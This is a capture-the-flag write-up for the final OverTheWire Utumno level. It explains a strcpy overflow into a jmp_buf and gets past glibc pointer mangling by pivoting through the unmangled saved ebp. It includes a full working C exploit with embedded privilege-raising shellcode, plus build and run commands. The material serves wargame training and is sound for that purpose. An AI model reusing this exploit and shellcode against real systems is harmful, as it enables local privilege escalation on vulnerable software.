# OverTheWire — Utumno Level 7 Solution (utumno7 → utumno8)  [FINAL LEVEL]

> Goal: Get utumno8 user's password from `utumno7`.
> Result: **utumno8 password = `**********`** (hidden) — **Utumno complete!**
> (Control via unmangled `jmp_buf[3]=ebp` through `leave;ret` pivot).

---

## 1. Connection

```bash
ssh utumno7@utumno.labs.overthewire.org -p 2227
# password: **********   (from the previous level)
```

---

## 2. Recon

```bash
strings /utumno/utumno7
#   strcpy, _setjmp, longjmp, "lol ulrich && fuck hector"
#   ... -fno-stack-protector ...      <-- NO canary
readelf -l /utumno/utumno7 | grep GNU_STACK      #   RWE -> stack EXECUTABLE
objdump -d ... | grep '<.*>:'    # functions: vuln, main, jmp
```

---

## 3. Static Analysis

```c
void vuln(char *s) {
    char buf[?];                    // ebp-0x120
    jmp_buf jb;                     // ebp-0xa0   (0x80 past buf)
    global_jb = &jb;                // ds:0x804b260
    if (setjmp(jb) == 0) {
        strcpy(buf, s);             // if s > 0x80, overwrites jb  <<< OVERFLOW
        jmp(23);                    // -> longjmp(global_jb, 23)
    }
    // longjmp returns here (after setjmp, 0x80491cd), ret=23 -> end -> leave;ret
}
void jmp(int v){ longjmp(global_jb, v); }
int main(int argc,char**argv){ if(argc<=1)exit(1); puts("lol ..."); vuln(argv[1]); }
```

- `buf = ebp-0x120`, `jmp_buf = ebp-0xa0` → distance between them = **0x80** (128 bytes).
- `argv[1] > 128 bytes` ⇒ `strcpy` overwrites jmp_buf.

### glibc jmp_buf (i386) layout
```
jmp_buf[0]=ebx  [1]=esi  [2]=edi  [3]=ebp        (PLAIN — not mangled)
         [4]=esp(MANGLED)  [5]=eip(MANGLED)
```
`longjmp` decodes `esp` and `eip` via **PTR_MANGLE**: `demangled = ror(M,9) XOR guard`,
`guard = %gs:0x18` (pointer guard).

---

## 4. PTR_MANGLE Obstacle and Bypass

To forge `eip`, we'd need `M = rol(target XOR guard, 9)` → requires **guard**.

**Experiment:** Wrote `0x47474747` into the `eip` field and ran twice, segfault addresses:
```
run1: si_addr=0xf1026794
run2: si_addr=0xfb461455      <-- DIFFERENT => guard is RANDOM per exec
```
⇒ Guard cannot be learned or forged (from AT_RANDOM, random even with ASLR off).

### Solution: ebp-pivot (don't touch the mangle)
`jmp_buf[3] = ebp` is **not mangled**. Plan:
1. Do **NOT overwrite** the `eip`/`esp` fields → `longjmp` returns cleanly to the original
   `eip` (`0x80491cd`).
2. Only control `jmp_buf[3]=ebp`.
3. At the end of `vuln`: `leave; ret`:
   - `leave`: `esp = ebp; pop ebp`  → `esp = ebp+4`
   - `ret`: `eip = *(ebp+4)`   ⇒ **jump to wherever ebp+4 points!**

So: point `ebp` to a location where `*(ebp+4) = shellcode_address`.

**Anchor = EGG env** (address known via printer, stack buf address is not needed):
Put a "pivot" `... [junk(4)][sled_addr(4)]` pattern inside EGG; set `ebp = pivot_address`.
`leave;ret` → `eip = *(pivot+4) = sled_addr` → NOP sled → shellcode (`cat utumno8`).

> `argv[1]` = 0x90 bytes: `0x80` padding + ebx + esi + edi + **ebp(pivot)**. The trailing NUL
> corrupts the low byte of the `esp` field (harmless — `leave` replaces `esp` with `ebp`; also
> the binary uses plain `longjmp` not `__longjmp_chk`, no esp validation).
> The `eip` field is not written → original mangled value stays → clean return to `0x80491cd`.

---

## 5. Final Exploit

### `ex7.c`
```c
#include <unistd.h>
#include <string.h>
#include <stdlib.h>
#include <stdio.h>
unsigned char sc[]={ /* null-free: setreuid; execve /bin/sh -c "cat .../utumno8" */
 0x31,0xc0,0xb0,0xc9,0xcd,0x80,0x89,0xc3,0x89,0xc1,0x31,0xc0,0xb0,0xcb,0xcd,0x80,
 0x31,0xc0,0x50,
 0x68,0x6d,0x6e,0x6f,0x38, 0x68,0x2f,0x75,0x74,0x75, 0x68,0x70,0x61,0x73,0x73,
 0x68,0x6d,0x6e,0x6f,0x5f, 0x68,0x2f,0x75,0x74,0x75, 0x68,0x2f,0x65,0x74,0x63,
 0x68,0x63,0x61,0x74,0x20, 0x89,0xe6,
 0x31,0xc0,0x50, 0x66,0xc7,0x04,0x24,0x2d,0x63, 0x89,0xe7,
 0x31,0xc0,0x50, 0x68,0x2f,0x2f,0x73,0x68, 0x68,0x2f,0x62,0x69,0x6e, 0x89,0xe5,
 0x31,0xc0,0x50,0x56,0x57,0x55, 0x89,0xe1,0x89,0xeb,0x31,0xd2,0x31,0xc0,0xb0,0x0b,0xcd,0x80};
#define SLED 60000
#define GAP 1024
static char eggenv[4+SLED+200+GAP+16];
static char arg1[160];
static char *envp[2];
int main(int argc,char**argv){
 unsigned int env0=0xffff0000; int run=0;
 if(argc>=3 && !strcmp(argv[1],"run")){ env0=strtoul(argv[2],0,16); run=1; }
 char *d=eggenv+4; memcpy(eggenv,"EGG=",4);
 memset(d,0x90,SLED); memcpy(d+SLED,sc,sizeof sc); memset(d+SLED+sizeof sc,0x90,GAP);
 int pivot_off=SLED+sizeof sc+GAP;
 unsigned int egg=env0+4, sled_addr=egg+30000;
 *(unsigned int*)(d+pivot_off)=0x41414141;       /* popped into ebp (junk) */
 *(unsigned int*)(d+pivot_off+4)=sled_addr;       /* -> eip via ret */
 d[pivot_off+8]=0;
 envp[0]=eggenv; envp[1]=0;
 unsigned int pivot_addr=egg+pivot_off;
 memset(arg1,'A',0x80);
 *(unsigned int*)(arg1+0x80)=0x41414141;          /* ebx */
 *(unsigned int*)(arg1+0x84)=0x41414141;          /* esi */
 *(unsigned int*)(arg1+0x88)=0x41414141;          /* edi */
 *(unsigned int*)(arg1+0x8c)=pivot_addr;          /* ebp (UNMANGLED) */
 arg1[0x90]=0;
 if(!run){ char *av[]={"/tmp/q7Bn3kLm9z",arg1,0}; execve("/tmp/q7Bn3kLm9z",av,envp); }
 else { char *av[]={"/utumno/utumno7",arg1,0}; execve("/utumno/utumno7",av,envp); }
 perror("execve"); return 1;
}
```

### Execution
```bash
gcc -m32 -o ex7 ex7.c
gcc -m32 -o /tmp/q7Bn3kLm9z pr.c          # environ[0] printer (fresh 15-char path)
ENV0=$(./ex7 find | sed -n 's/.*ENVADDR=0x\([0-9a-f]*\).*/\1/p')
./ex7 run "$ENV0"
```

Output:
```
ENV0=fffef117
lol ulrich && fuck hector
**********
```

---

## Summary / Lessons Learned

| Topic | Note |
|-------|------|
| **jmp_buf overflow** | `strcpy(buf, argv[1])` → overwrites `jmp_buf` 0x80 bytes away |
| **PTR_MANGLE** | glibc `setjmp/longjmp` masks esp+eip with `ror/xor guard`; guard is random per exec |
| **Bypass = ebp-pivot** | `jmp_buf[3]=ebp` is not mangled; don't touch eip/esp → `leave;ret` gives `eip=*(ebp+4)` |
| **EGG anchor** | Point ebp to pivot in env → no stack buf address needed, only env address |
| **`longjmp` vs `__longjmp_chk`** | Plain `longjmp` does no esp validation → corrupted esp is harmless |
